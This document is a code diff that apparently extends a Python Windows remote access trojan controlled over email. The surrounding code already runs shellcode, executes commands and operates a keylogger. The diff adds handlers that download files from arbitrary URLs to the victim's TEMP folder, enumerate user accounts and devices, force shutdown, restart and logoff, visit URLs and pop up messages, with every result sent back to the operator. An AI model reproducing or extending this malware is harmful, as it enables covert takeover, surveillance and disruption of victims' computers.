@@ -48,6 +48,7 @@ import getpass
 import uuid
 import netifaces
 import urllib2
+import urllib
 import pythoncom
 
 from win32com.client import GetObject
@@ -106,6 +107,13 @@ class InfoSecurity:
 infoSec = InfoSecurity()
 
 
+class AccountType(Enum):
+    DUPLICATE_ACCOUNT = 256
+    NORMAL_ACCOUNT = 512
+    INTERDOMAIN_TRUST_ACCOUNT = 2048
+    WORKSTATION_TRUST_ACCOUNT = 4096
+    SERVER_TRUST_ACCOUNT = 8192
+    
 class ChassisTypes(Enum):
     Other = 1
     Unknown = 2
@@ -133,20 +141,17 @@ class ChassisTypes(Enum):
     SealedCasePC = 24
         
 def getGeolocation():
-    """Retrieve IP Geolocation for single target"""
-    
-
-    req = urllib2.Request('http://ip-api.com/json/', data=None, headers={
-      'User-Agent':'Gdog'
-    })
-    
-    response = urllib2.urlopen(req)
-    
-    if response.code == 200:
-        encoding = response.headers.getparam('charset')
-        return json.loads(response.read().decode(encoding))
-            
-    return False
+    try:    
+        req = urllib2.Request('http://ip-api.com/json/', data=None, headers={
+          'User-Agent':'Gdog'
+        })
+        response = urllib2.urlopen(req)
+        if response.code == 200:
+            encoding = response.headers.getparam('charset')
+            return json.loads(response.read().decode(encoding))
+        return False
+    except Exception:
+        return False
 
 
 class SystemInfo:
@@ -203,6 +208,7 @@ class SystemInfo:
             self.Antispyware.append(i.displayName.strip())
         self.Geolocation = getGeolocation()
     
+
         self.UniqueID = hashlib.sha256(
                            self.Architecture + 
                            self.WinVer + 
@@ -555,6 +561,23 @@ class download(threading.Thread):
             sendEmail({'cmd': 'download', 'res': 'Failed: {}'.format(e)}, self.jobid)
 
 
+class downloadfromurl(threading.Thread):
+
+    def __init__(self, jobid, url):
+        threading.Thread.__init__(self)
+        self.jobid = jobid
+        self.url = url
+        self.daemon = True
+        self.start()
+
+    def run(self):
+        try:
+            urllib.urlretrieve(self.url, os.path.join(os.getenv('TEMP') + '\\'  + self.url.split('/')[-1]))
+            sendEmail({'cmd': 'downloadfromurl', 'res': 'Success'}, self.jobid, [self.url])
+        except Exception as e:
+            sendEmail({'cmd': 'downloadfromurl', 'res': 'Failed: {}'.format(e)}, self.jobid)
+            
+
 class tasks(threading.Thread):
 
     def __init__(self, jobid):
@@ -600,7 +623,53 @@ class services(threading.Thread):
         except Exception as e:
             sendEmail({'cmd': 'services', 'res': 'Failed: {}'.format(e)}, self.jobid)
             
-                 
+
+class users(threading.Thread):
+
+    def __init__(self, jobid):
+        threading.Thread.__init__(self)
+        self.jobid = jobid
+        self.daemon = True
+        self.start()
+
+    def _detectUsers(self):
+        pythoncom.CoInitialize()
+        usr = []
+        w = wmi.WMI ()
+        for user in w.Win32_UserAccount ():
+            usr.append('{0};{1};{2}'.format(user.Name, str(AccountType(user.AccountType)).split('.')[1], 'Disabled' if user.Disabled else 'Enabled'))
+        return usr
+    
+    def run(self):
+        try:
+            sendEmail({'cmd': 'users', 'res': self._detectUsers()}, self.jobid)
+        except Exception as e:
+            sendEmail({'cmd': 'users', 'res': 'Failed: {}'.format(e)}, self.jobid)
+            
+
+class devices(threading.Thread):
+
+    def __init__(self, jobid):
+        threading.Thread.__init__(self)
+        self.jobid = jobid
+        self.daemon = True
+        self.start()
+
+    def _detectDevices(self):
+        pythoncom.CoInitialize()
+        devs = []
+        w = wmi.WMI ()
+        for dev in w.Win32_PnPEntity ():
+            devs.append('{0};{1}'.format(dev.Name, dev.Manufacturer))
+        return devs
+    
+    def run(self):
+        try:
+            sendEmail({'cmd': 'devices', 'res': self._detectDevices()}, self.jobid)
+        except Exception as e:
+            sendEmail({'cmd': 'devices', 'res': 'Failed: {}'.format(e)}, self.jobid)
+        
+               
 class upload(threading.Thread):
 
     def __init__(self, jobid, dest, attachment):
@@ -608,7 +677,6 @@ class upload(threading.Thread):
         self.jobid = jobid
         self.dest = dest
         self.attachment = attachment
-
         self.daemon = True
         self.start()
 
@@ -626,7 +694,6 @@ class lockScreen(threading.Thread):
     def __init__(self, jobid):
         threading.Thread.__init__(self)
         self.jobid = jobid
-
         self.daemon = True
         self.start()
 
@@ -637,8 +704,61 @@ class lockScreen(threading.Thread):
         except Exception as e:
             #if verbose == True: print print_exc()
             pass
+        
+        
+class shutdown(threading.Thread):
+
+    def __init__(self, jobid):
+        threading.Thread.__init__(self)
+        self.jobid = jobid
+        self.daemon = True
+        self.start()
+
+    def run(self):
+        try:
+            sendEmail({'cmd': 'shutdown', 'res': 'Success'}, jobid=self.jobid)
+            time.sleep(3)
+            subprocess.call(["shutdown", "/f", "/s", "/t", "0"])
+        except Exception as e:
+            #if verbose == True: print print_exc()
+            pass
 
 
+class restart(threading.Thread):
+
+    def __init__(self, jobid):
+        threading.Thread.__init__(self)
+        self.jobid = jobid
+        self.daemon = True
+        self.start()
+
+    def run(self):
+        try:
+            sendEmail({'cmd': 'restart', 'res': 'Success'}, jobid=self.jobid)
+            time.sleep(3)
+            subprocess.call(["shutdown", "/f", "/r", "/t", "0"])            
+        except Exception as e:
+            #if verbose == True: print print_exc()
+            pass
+        
+        
+class logoff(threading.Thread):
+
+    def __init__(self, jobid):
+        threading.Thread.__init__(self)
+        self.jobid = jobid
+        self.daemon = True
+        self.start()
+
+    def run(self):
+        try:
+            sendEmail({'cmd': 'logoff', 'res': 'Success'}, jobid=self.jobid)
+            time.sleep(3)
+            subprocess.call(["shutdown", "/f", "/l"])            
+        except Exception as e:
+            #if verbose == True: print print_exc()
+            pass
+        
 class execShellcode(threading.Thread):
 
     def __init__(self, shellc, jobid):
@@ -676,6 +796,24 @@ class execShellcode(threading.Thread):
             pass
 
 
+class visitwebsite(threading.Thread):
+
+    def __init__(self, url, jobid):
+        threading.Thread.__init__(self)
+        self.url = url
+        self.jobid = jobid
+        self.daemon = True
+        self.start()
+
+    def run(self):
+        try:
+            urllib2.urlopen(self.url).read()
+            sendEmail({'cmd': 'visitwebsite', 'res': 'Success'}, jobid=self.jobid)
+        except Exception as e:
+            #if verbose == True: print_exc()
+            pass
+        
+        
 class execCmd(threading.Thread):
 
     def __init__(self, command, jobid):
@@ -696,6 +834,26 @@ class execCmd(threading.Thread):
         except Exception as e:
             #if verbose == True: print_exc()
             pass
+
+
+class message(threading.Thread):
+
+    def __init__(self, TextAndTitle, jobid):
+        threading.Thread.__init__(self)
+        self.TextAndTitle = TextAndTitle
+        self.jobid = jobid
+
+        self.daemon = True
+        self.start()
+
+    def run(self):
+        try:
+            ctypes.windll.user32.MessageBoxW(0, self.TextAndTitle[0], self.TextAndTitle[1], 0)
+            sendEmail({'cmd': 'message', 'res': 'Success'}, jobid=self.jobid)
+        except Exception as e:
+            #if verbose == True: print_exc()
+            pass
+
 
 def genRandomString(slen=10):
     return ''.join(random.sample(string.ascii_letters + string.digits, slen))
@@ -825,6 +983,9 @@ def checkJobs():
 
                     elif cmd == 'download':
                         download(jobid, arg)
+                        
+                    elif cmd == 'downloadfromurl':
+                        downloadfromurl(jobid, arg)
 
                     elif cmd == 'upload':
                         upload(jobid, arg, msg.attachment)
@@ -837,13 +998,34 @@ def checkJobs():
                         
                     elif cmd == 'services':
                         services(jobid)
+                        
+                    elif cmd == 'users':
+                        users(jobid)
+                        
+                    elif cmd == 'devices':
+                        devices(jobid)
 
                     elif cmd == 'cmd':
                         execCmd(arg, jobid)
+                        
+                    elif cmd == 'visitwebsite':
+                        visitwebsite(arg, jobid)
+                        
+                    elif cmd == 'message':
+                        message(arg, jobid)
 
                     elif cmd == 'lockscreen':
                         lockScreen(jobid)
 
+                    elif cmd == 'shutdown':
+                        shutdown(jobid)
+                        
+                    elif cmd == 'restart':
+                        restart(jobid)
+                        
+                    elif cmd == 'logoff':
+                        logoff(jobid)
+                        
                     elif cmd == 'startkeylogger':
                         keylogger.exit = False
                         keylogger(jobid)
